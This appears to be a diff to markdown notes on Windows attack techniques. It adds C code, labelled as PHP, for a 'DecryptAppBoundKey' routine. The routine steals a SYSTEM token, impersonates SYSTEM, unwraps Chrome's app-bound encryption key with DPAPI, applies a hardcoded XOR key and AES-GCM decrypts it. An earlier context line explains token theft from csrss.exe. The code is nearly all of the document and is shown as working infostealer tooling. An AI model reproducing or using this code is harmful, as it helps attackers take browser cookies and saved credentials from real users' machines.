@@ -409,9 +409,6 @@ HANDLE GetSystemToken()
 
 
 
-
-
-
 ### OpenProcessTokenByName
 
 ```php
@@ -453,3 +450,113 @@ HANDLE OpenProcessTokenByName(_In_ LPCWSTR ProcessName)
 ```
 --> `This function retrieves the access token of a target process (csrss.exe) by resolving its PID, opening the process, and calling OpenProcessToken with duplicate rights. The returned token can later be used for impersonation or spawning processes under the target’s security context (SYSTEM).`
 
+
+
+### DecryptAppBoundKey
+
+```php
+CONST UCHAR XorKey[] = { 0xCC, 0xF8, 0xA1, 0xCE, 0xC5, 0x66, 0x05, 0xB8, 0x51, 0x75, 0x52, 0xBA, 0x1A, 0x2D, 0x06, 0x1C, 0x03, 0xA2, 0x9E, 0x90, 0x27, 0x4F, 0xB2, 0xFC, 0xF5, 0x9B, 0xA4, 0xB7, 0x5C, 0x39, 0x23, 0x90 };
+
+BOOLEAN DecryptAppBoundKey(_In_ PUCHAR AppBoundKey, _In_ ULONG AppBoundKeySize, _Out_ PUCHAR DecryptedKey)
+{
+    DATA_BLOB EncryptedKey;
+    DATA_BLOB UserKey;
+    DATA_BLOB Key = { 0 };
+    PUCHAR    AesKey;
+    PUCHAR    Nonce;
+    PUCHAR    Ciphertext;
+    PUCHAR    Tag;
+    BOOLEAN   Result;
+    HANDLE    SystemToken;
+
+    SystemToken = GetSystemToken();
+
+    if (SystemToken == 0)
+    {
+        return 0;
+    }
+
+    do
+    {
+        
+
+        Result = ImpersonateLoggedOnUser(SystemToken);
+
+        if (Result == FALSE)
+        {
+            break;
+        }
+
+        EncryptedKey.pbData = AppBoundKey;
+        EncryptedKey.cbData = AppBoundKeySize;
+
+        Result = CryptUnprotectData(&EncryptedKey, 0, 0, 0, 0, 0, &UserKey);
+        RevertToSelf();
+
+        if (Result == FALSE)
+        {
+            wprintf(L"Could not decrypt the app-bound key as SYSTEM\n");
+            break;
+        }
+
+        
+
+        Result = CryptUnprotectData(&UserKey, 0, 0, 0, 0, 0, &Key);
+        LocalFree(UserKey.pbData);
+
+        if (Result == FALSE)
+        {
+            wprintf(L"Could not decrypt the app-bound key as the Chrome user\n");
+            break;
+        }
+
+        
+
+        AesKey = *(PULONG)Key.pbData + (Key.pbData + sizeof(ULONG)) + sizeof(ULONG) + 1;
+        Nonce = AesKey + 32;        
+        Ciphertext = Nonce + 12;     
+        Tag = Ciphertext + 32;       
+
+        
+
+        Result = ImpersonateLoggedOnUser(SystemToken);
+
+        if (Result == FALSE)
+        {
+            break;
+        }
+
+        Result = DecryptUsingChromeKey(AesKey);
+        RevertToSelf();
+
+        if (Result == FALSE)
+        {
+            break;
+        }
+
+        for (UCHAR Index = 0; Index < 32; Index++)
+        {
+            AesKey[Index] ^= XorKey[Index];
+        }
+
+        
+
+        Result = Aes256GcmDecrypt(AesKey, 32, Nonce, 12, Tag, 16, Ciphertext, 32);
+
+        if (Result == TRUE)
+        {
+            RtlCopyMemory(DecryptedKey, Ciphertext, 32);
+        }
+
+    } while (FALSE);
+
+    if (Key.pbData != 0)
+    {
+        LocalFree(Key.pbData);
+    }
+
+    CloseHandle(SystemToken);
+    return Result;
+}
+
+```
